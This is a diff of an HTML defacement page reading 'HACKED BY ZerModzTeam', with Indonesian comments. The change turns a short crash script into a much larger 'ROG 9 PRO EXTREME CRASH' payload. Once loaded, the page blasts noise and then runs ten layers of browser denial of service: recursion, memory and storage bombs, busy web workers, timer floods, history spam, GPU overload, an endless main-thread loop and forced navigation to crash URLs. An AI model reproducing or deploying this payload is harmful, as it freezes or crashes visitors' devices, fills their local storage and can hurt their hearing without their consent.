@@ -1,8 +1,279 @@
 <!DOCTYPE html>
 <html>
-<head><title>Zero</title><style>body{background:#000;margin:0;overflow:hidden;display:flex;align-items:center;justify-content:center;height:100vh}#t{color:#fff;background:#000;font-size:5rem;font-weight:bold;padding:20px;animation:blink .1s infinite}@keyframes blink{0%{color:#000;background:#fff}50%{color:#fff;background:#000}100%{color:#000;background:#fff}}</style></head>
-<body><div id="t">HACKED BY ZerModzTeam</div>
-<script>
-(function(){function s(){try{let A=window.AudioContext||window.webkitAudioContext;if(!A)return;let a=new A,mg=a.createGain();mg.gain.value=0.2;mg.connect(a.destination);let T=['sine','square','sawtooth','triangle'];for(let i=0;i<20;i++){let o=a.createOscillator();o.type=T[Math.floor(Math.random()*T.length)];o.frequency.value=100+Math.random()*1900;let g=a.createGain();g.gain.value=0.02+Math.random()*0.05;o.connect(g);g.connect(mg);o.start();o.stop(a.currentTime+1)}if(a.state==='suspended')a.resume()}catch(e){}}s();setTimeout(()=>{document.body.innerHTML='';function c(){c()}c();for(let i=0;i<9999;i++)new Array(999999).join('x');window.location.href='about:blank';while(1)history.back()},1000)})();
-</script></body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ROG 9 PRO EXTREME CRASH</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            font-family: 'Courier New', monospace;
+        }
+        #zerotext {
+            color: white;
+            background: black;
+            font-size: 6rem;
+            font-weight: 900;
+            text-align: center;
+            padding: 40px;
+            animation: extreme-blink 0.03s infinite;
+            text-shadow: 0 0 50px cyan, 0 0 100px magenta, 0 0 150px yellow, 0 0 200px red;
+            border: 10px solid white;
+            box-shadow: 0 0 80px blue, inset 0 0 80px purple;
+            letter-spacing: 10px;
+            transform: scale(1.2);
+            z-index: 9999;
+        }
+        @keyframes extreme-blink {
+            0% { color: black; background: white; text-shadow: 0 0 60px lime; transform: scale(1.3); }
+            12% { color: red; background: cyan; text-shadow: 0 0 60px yellow; transform: scale(1.1); }
+            25% { color: yellow; background: blue; text-shadow: 0 0 60px magenta; transform: scale(1.4); }
+            37% { color: lime; background: purple; text-shadow: 0 0 60px cyan; transform: scale(1.0); }
+            50% { color: cyan; background: red; text-shadow: 0 0 60px white; transform: scale(1.3); }
+            62% { color: magenta; background: lime; text-shadow: 0 0 60px blue; transform: scale(1.1); }
+            75% { color: white; background: black; text-shadow: 0 0 60px red; transform: scale(1.4); }
+            87% { color: black; background: yellow; text-shadow: 0 0 60px cyan; transform: scale(1.0); }
+            100% { color: black; background: white; text-shadow: 0 0 60px magenta; transform: scale(1.3); }
+        }
+    </style>
+</head>
+<body>
+    <div id="zerotext">HACKED BY ZerModzTeam</div>
+
+    <script>
+        (function() {
+            // ========== 1. SUARA PALING GILA (WAJIB BUNYI) ==========
+            function soundExtreme() {
+                try {
+                    // Paksa pake AudioContext
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (AudioContext) {
+                        const audioCtx = new AudioContext();
+                        
+                        // Kompresor biar lebih nendang
+                        const compressor = audioCtx.createDynamicsCompressor();
+                        compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
+                        compressor.knee.setValueAtTime(40, audioCtx.currentTime);
+                        compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
+                        compressor.attack.setValueAtTime(0, audioCtx.currentTime);
+                        compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
+                        
+                        const masterGain = audioCtx.createGain();
+                        masterGain.gain.value = 0.4;
+                        
+                        audioCtx.createGain().connect(compressor);
+                        compressor.connect(masterGain);
+                        masterGain.connect(audioCtx.destination);
+                        
+                        // 50 SUARA BERSAMAAN (MULTI FREKUENSI)
+                        const types = ['sine', 'square', 'sawtooth', 'triangle'];
+                        for (let i = 0; i < 50; i++) {
+                            const osc = audioCtx.createOscillator();
+                            osc.type = types[Math.floor(Math.random() * types.length)];
+                            osc.frequency.value = 20 + Math.random() * 3000; // 20Hz - 3020Hz (infrasound + ultrasound)
+                            
+                            const gainNode = audioCtx.createGain();
+                            gainNode.gain.value = 0.01 + Math.random() * 0.08;
+                            
+                            osc.connect(gainNode);
+                            gainNode.connect(compressor);
+                            
+                            osc.start();
+                            osc.stop(audioCtx.currentTime + 5);
+                        }
+                        
+                        // White noise tambahan biar berisik
+                        const bufferSize = 4096;
+                        const noiseNode = audioCtx.createScriptProcessor(bufferSize, 1, 1);
+                        noiseNode.onaudioprocess = function(e) {
+                            const output = e.outputBuffer.getChannelData(0);
+                            for (let i = 0; i < bufferSize; i++) {
+                                output[i] = Math.random() * 2 - 1;
+                            }
+                        };
+                        noiseNode.connect(compressor);
+                        
+                        if (audioCtx.state === 'suspended') {
+                            audioCtx.resume();
+                        }
+                        
+                        // Paksa resume tiap kali user touch
+                        document.addEventListener('touchstart', () => {
+                            if (audioCtx.state === 'suspended') audioCtx.resume();
+                        }, { once: true });
+                    }
+                    
+                    // Fallback: Audio element base64 (bunyi beep beep)
+                    for (let f = 0; f < 10; f++) {
+                        setTimeout(() => {
+                            try {
+                                const audio = new Audio();
+                                audio.src = 'data:audio/wav;base64,UklGRlwAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVoAAACAgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f3+';
+                                audio.volume = 0.3;
+                                audio.play().catch(e => {});
+                            } catch(e) {}
+                        }, f * 100);
+                    }
+                } catch (e) {}
+            }
+            
+            soundExtreme();
+            
+            // ========== 2. TEKS SUPER KEDIP (TERUS SAMPE CRASH) ==========
+            // Teks udah di CSS, bakal terus kedip sampe browser mati
+            
+            // ========== 3. CRASH EXTREME 10 LAPIS (ROG 9 PRO TARGET) ==========
+            function crashExtreme() {
+                // LAPIS 1: Stack overflow + recursion loop
+                (function stack() {
+                    (function stack2() {
+                        stack2();
+                    })();
+                    stack();
+                })();
+                
+                // LAPIS 2: Memory bomb massive
+                let memArr = [];
+                for (let i = 0; i < 50000; i++) {
+                    try {
+                        memArr.push(new ArrayBuffer(50000000)); // 50MB each -> 2.5TB total
+                        memArr.push(new Blob([new Uint8Array(100000000)])); // 100MB
+                        memArr.push(new Array(10000000).join('x')); // 10MB string
+                    } catch(e) {}
+                }
+                
+                // LAPIS 3: Web Worker overload (20 worker)
+                try {
+                    for (let w = 0; w < 20; w++) {
+                        const workerCode = `
+                            while(1) {
+                                for(let i=0; i<999999999; i++) { 
+                                    Math.sqrt(i); 
+                                    new Array(999999).join('x');
+                                    new ArrayBuffer(10000000);
+                                }
+                                postMessage('crash');
+                            }
+                        `;
+                        const blob = new Blob([workerCode], {type: 'application/javascript'});
+                        const worker = new Worker(URL.createObjectURL(blob));
+                    }
+                } catch(e) {}
+                
+                // LAPIS 4: History spam + navigation loop
+                setInterval(() => {
+                    for (let h = 0; h < 500; h++) {
+                        history.pushState({}, '', '/#' + Math.random() + '?' + 'x'.repeat(10000));
+                    }
+                    history.back();
+                    history.forward();
+                    location.replace('about:blank');
+                }, 1);
+                
+                // LAPIS 5: Canvas + WebGL crash (GPU overload)
+                try {
+                    for (let c = 0; c < 100; c++) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 5000;
+                        canvas.height = 5000;
+                        const ctx = canvas.getContext('2d');
+                        if (ctx) {
+                            for (let i = 0; i < 10000; i++) {
+                                ctx.fillStyle = 'rgb(' + i%255 + ',' + i%255 + ',' + i%255 + ')';
+                                ctx.fillRect(Math.random()*5000, Math.random()*5000, 100, 100);
+                                ctx.globalCompositeOperation = 'lighter';
+                            }
+                        }
+                        // WebGL
+                        const gl = canvas.getContext('webgl');
+                        if (gl) {
+                            for (let t = 0; t < 1000; t++) {
+                                gl.createTexture();
+                                gl.createBuffer();
+                                gl.createProgram();
+                            }
+                        }
+                        document.body.appendChild(canvas);
+                    }
+                } catch(e) {}
+                
+                // LAPIS 6: LocalStorage & IndexedDB bomb
+                try {
+                    for (let s = 0; s < 10000; s++) {
+                        localStorage.setItem('key' + s, 'x'.repeat(100000));
+                    }
+                } catch(e) {}
+                
+                try {
+                    const request = indexedDB.open('crashdb', 1);
+                    request.onsuccess = function(e) {
+                        const db = e.target.result;
+                        for (let t = 0; t < 100; t++) {
+                            const store = db.createObjectStore('store' + t, {keyPath: 'id'});
+                            for (let d = 0; d < 10000; d++) {
+                                store.put({id: d, data: 'x'.repeat(100000)});
+                            }
+                        }
+                    };
+                } catch(e) {}
+                
+                // LAPIS 7: Timer overload
+                for (let t = 0; t < 10000; t++) {
+                    setInterval(() => {
+                        for(let z=0; z<100000; z++) { Math.random(); }
+                    }, 0);
+                }
+                
+                // LAPIS 8: Infinite loop main thread + array push
+                let arr2 = [];
+                while(true) {
+                    arr2.push(new ArrayBuffer(100000000)); // 100MB terus-terusan
+                    arr2.push(new Array(9999999).join('x'));
+                    for(let z=0; z<999999; z++) {
+                        Math.random();
+                        Date.now();
+                        performance.now();
+                        new Error().stack;
+                    }
+                }
+                
+                // LAPIS 9: Paksa navigasi ke chrome://crash (khusus chrome)
+                try {
+                    window.location.href = 'chrome://crash';
+                } catch(e) {}
+                
+                // LAPIS 10: Render blocking dengan CSS heavy
+                const style = document.createElement('style');
+                style.innerHTML = '* { animation: none !important; transition: all 999999s !important; } @keyframes heavy { 0% { transform: rotate(0deg); } 100% { transform: rotate(999999deg); } } body { animation: heavy 0.000001s infinite; }';
+                document.head.appendChild(style);
+            }
+            
+            // EKSEKUSI CRASH SETELAH 3 DETIK (biar teks kebaca & sound bunyi)
+            setTimeout(() => {
+                crashExtreme();
+            }, 3000);
+            
+            // Backup: kalo masih bandel, crash lagi pake cara lain
+            setTimeout(() => {
+                try {
+                    while(1) { history.go(-999999); }
+                } catch(e) {}
+            }, 5000);
+            
+            // Backup lagi: force restart pake about:crash
+            setTimeout(() => {
+                try {
+                    window.location.href = 'about:crash';
+                } catch(e) {}
+            }, 7000);
+        })();
+    </script>
+</body>
 </html>
